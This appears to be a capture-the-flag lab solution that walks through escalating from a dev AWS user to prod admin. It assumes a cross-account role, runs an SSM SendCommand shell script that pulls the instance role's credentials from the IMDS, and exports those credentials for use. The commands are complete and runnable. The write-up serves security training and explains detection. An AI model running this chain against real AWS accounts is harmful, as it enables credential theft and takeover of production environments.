# Solution: Dev to Prod via SSM StartSession to EC2 with Admin Role

This scenario demonstrates a multi-hop cross-account privilege escalation chain that combines three independently common misconfigurations into a reliable path from a dev account credential to full administrative control of the prod account. The technique works by abusing AWS Systems Manager's remote command execution capabilities to reach inside an EC2 instance and harvest the temporary credentials that the Instance Metadata Service (IMDS) vends automatically to the instance's attached IAM role.

What makes this attack pattern particularly dangerous is that none of the individual components looks alarming in isolation. A cross-account role that lets developers reach prod for operational purposes is routine. SSM SendCommand permissions are a standard replacement for SSH. EC2 instances with IAM roles are universal — every application that talks to AWS uses them. The vulnerability emerges only when you trace the full chain: a dev principal can assume a prod role, that prod role can execute arbitrary shell code on a prod instance, and that instance's attached role happens to be an administrator. The IMDS is the pivot point — it treats the running shell command as a trusted insider and hands over fully functional admin credentials without any additional authentication.

Unlike traditional lateral movement attacks that require exploiting vulnerabilities or guessing credentials, this chain is entirely made of legitimate AWS API calls. There is no exploit, no vulnerability in the traditional sense — only permissions that were each granted for reasonable-sounding reasons and that compose into an escalation path.

## The Challenge

You have obtained credentials for `pl-dev-ssm-ec2-starting-user` — a low-privilege IAM user in the dev account. This user has the ability to assume a role in the prod account, which is a common pattern for developer access to shared infrastructure.

Your goal is to achieve full administrative access to the prod account, then retrieve the CTF flag from SSM Parameter Store. The flag is stored at `/pathfinding-labs/flags/ssm-startsession-ec2-admin-to-admin` and requires admin-equivalent permissions to read.

Start by setting your credentials and confirming your starting identity:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
```

You should see `pl-dev-ssm-ec2-starting-user` in the dev account. Now confirm you have no admin access yet:

```bash
aws iam list-users --max-items 1
# AccessDenied
```

Good. No admin access. Time to change that.

## Reconnaissance

Before jumping to exploitation, take stock of what the dev user can actually reach. The starting user has `iam:ListRoles` as a helpful permission — use it to discover roles it might be able to assume:

```bash
aws iam list-roles \
  --query 'Roles[?starts_with(RoleName, `pl-prod`)].{Name:RoleName,ARN:Arn}' \
  --output table
```

You'll see `pl-prod-ssm-ec2-pivot-role` in the results. The name alone tells you something useful: this role is a bridge into prod, and its connection to SSM and EC2 suggests it exists for operational access. Check whether the starting user can assume it:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::{prod_account_id}:role/pl-prod-ssm-ec2-pivot-role \
  --role-session-name recon-check \
  --dry-run 2>&1 || true
```

It works. Now assume the role for real in the next step.

Once you have the pivot role's credentials, you can explore what's running in prod. Switch to those credentials temporarily to enumerate EC2 instances:

```bash
aws ec2 describe-instances \
  --query 'Reservations[*].Instances[*].[InstanceId,State.Name,IamInstanceProfile.Arn,Tags[?Key==`Name`].Value|[0]]' \
  --output table
```

You'll find `pl-prod-ssm-ec2-instance` with an instance profile attached. The instance profile ARN points to `pl-prod-ssm-ec2-admin-role` — an admin role. That is the jackpot. Confirm the instance is reachable via SSM:

```bash
aws ssm describe-instance-information \
  --query 'InstanceInformationList[*].[InstanceId,PingStatus,PlatformName]' \
  --output table
```

`Online` in the PingStatus column means the SSM agent is running and the instance is ready to receive commands.

## Exploitation

### Hop 1: Dev Account to Prod Pivot Role

Assume the prod pivot role using the dev account starting user credentials:

```bash
PIVOT_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::{prod_account_id}:role/pl-prod-ssm-ec2-pivot-role \
  --role-session-name dev-to-prod-ssm-attack \
  --query 'Credentials' \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $PIVOT_CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $PIVOT_CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $PIVOT_CREDS | jq -r '.SessionToken')

aws sts get-caller-identity
```

You are now `pl-prod-ssm-ec2-pivot-role` in the prod account. The cross-account boundary is behind you. The dev account credential that got you here can no longer be used — you are operating entirely within the prod account now, using a temporary session.

### Hop 2: SSM SendCommand to EC2 Instance with IMDS Credential Extraction

Here is the core of the attack. The pivot role cannot directly read the admin role's credentials — only the EC2 instance has access to its own IMDS endpoint. But the pivot role can send arbitrary shell commands to the instance. Those commands run inside the instance's trust boundary, where the IMDS is fully accessible.

Craft a shell script that:
1. Fetches an IMDSv2 session token (the instance allows both IMDSv1 and IMDSv2; using IMDSv2 is recommended best practice)
2. Queries the IMDS for the attached role's name
3. Queries the IMDS for that role's temporary credentials
4. Exports those credentials
5. Uses them to read the CTF flag from SSM Parameter Store

Send it all in one `ssm:SendCommand` invocation:

```bash
COMMAND_ID=$(aws ssm send-command \
  --instance-ids <instance-id> \
  --document-name AWS-RunShellScript \
  --parameters 'commands=[
    "TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600)",
    "ROLE=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)",
    "echo \"Instance role: $ROLE\"",
    "CREDS=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)",
    "export AWS_ACCESS_KEY_ID=$(echo $CREDS | python3 -c \"import sys,json;print(json.load(sys.stdin)['\''AccessKeyId'\''])\")",
    "export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | python3 -c \"import sys,json;print(json.load(sys.stdin)['\''SecretAccessKey'\''])\")",
    "export AWS_SESSION_TOKEN=$(echo $CREDS | python3 -c \"import sys,json;print(json.load(sys.stdin)['\''Token'\''])\")",
    "aws sts get-caller-identity",
    "aws ssm get-parameter --name /pathfinding-labs/flags/ssm-startsession-ec2-admin-to-admin --query Parameter.Value --output text"
  ]' \
  --query 'Command.CommandId' \
  --output text)

echo "Command ID: $COMMAND_ID"
```

A few things worth understanding here. First, IMDSv2 is used in the example above (the preliminary PUT call gets a session token you must include in subsequent requests). The instance is configured with `http_tokens = optional`, meaning IMDSv1 plain-curl requests also work — but IMDSv2 is the recommended approach and is shown throughout. Second, the IMDS endpoint at `/meta-data/iam/security-credentials/` (note the trailing slash) returns just the role name as a plain string — you then append that name to the URL path to get the full credentials JSON. Third, the script runs entirely inside the instance's network namespace, where `169.254.169.254` is reachable — you cannot hit IMDS from outside the instance.

Now poll for the result:

```bash
sleep 5

aws ssm get-command-invocation \
  --command-id $COMMAND_ID \
  --instance-id <instance-id> \
  --query '[Status,StandardOutputContent]' \
  --output table
```

Keep polling until Status shows `Success`. The StandardOutputContent will contain the caller identity confirming the instance role (`pl-prod-ssm-ec2-admin-role`) and, on the final line, the CTF flag.

## Verification

The `aws sts get-caller-identity` call embedded in the SSM script provides inline verification. In the command output you should see the assumed-role ARN for `pl-prod-ssm-ec2-admin-role` — proof that the IMDS credential retrieval succeeded and the admin role is the active identity inside the script.

To verify admin access more explicitly from your local machine, copy the credentials out of the IMDS response JSON and export them locally:

```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId from IMDS response>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from IMDS response>
export AWS_SESSION_TOKEN=<Token from IMDS response>

aws iam list-users --max-items 3 --output table
```

If you see IAM users listed without an AccessDenied error, you hold admin credentials. The escalation is complete.

## Capture the Flag

The CTF flag is stored in AWS Systems Manager Parameter Store at `/pathfinding-labs/flags/ssm-startsession-ec2-admin-to-admin`. Retrieving it requires the admin credentials from the EC2 instance role — which is why the demo script retrieves the flag directly inside the SSM shell command rather than locally. The IMDS credentials are scoped to the instance's network boundary and expire, but for the CTF the cleanest approach is to read the flag while you still have those credentials active.

If you embedded the flag retrieval in the `ssm:SendCommand` script as shown above, the output is already in StandardOutputContent. If you want to retrieve it separately using locally exported admin credentials:

```bash
aws ssm get-parameter \
  --name /pathfinding-labs/flags/ssm-startsession-ec2-admin-to-admin \
  --query 'Parameter.Value' \
  --output text
```

The value returned is the scenario flag. Its exact contents are deployment-specific — the default value ships in `flags.default.yaml` at the repo root, and vendor-run labs may use a different value injected at deploy time. The retrieval mechanism and parameter path are identical across every `to-admin` scenario; only the scenario identifier in the path changes.

Note: the flag must be read using the admin role's credentials, not the pivot role's credentials. The pivot role holds SSM send permissions, not `ssm:GetParameter` on this path. The admin role's `AdministratorAccess` policy covers it.

## What Happened

The attack traversed three distinct layers of trust, none of which required bypassing any security control outright — each step was a legitimate API call with legitimate permissions:

1. **Cross-account assume**: The dev starting user had `sts:AssumeRole` permission on a prod account role. This is a common pattern for developer access. It moved the attack across the account boundary.

2. **SSM remote execution**: The prod pivot role had `ssm:SendCommand` on EC2 instances with no resource-level conditions. This is also common — broad SSM permissions are often granted for operational troubleshooting. It turned API access into code execution inside an instance's trust boundary.

3. **IMDS credential harvest**: The EC2 instance had an admin IAM role attached as its instance profile. Any code running on the instance — including the SSM-delivered shell script — inherits that role's identity via the IMDS. No exploit required; the credentials are handed out automatically.

In real environments this chain appears when organizations apply least-privilege thinking at the individual permission level but not at the composition level. Each team that granted these permissions made a reasonable-sounding decision. The security failure is that nobody traced the full chain from dev user to prod admin. Graph-based IAM analysis — the kind that maps all possible role assumption paths across accounts — is the primary detection mechanism that catches this type of risk before it becomes an incident.
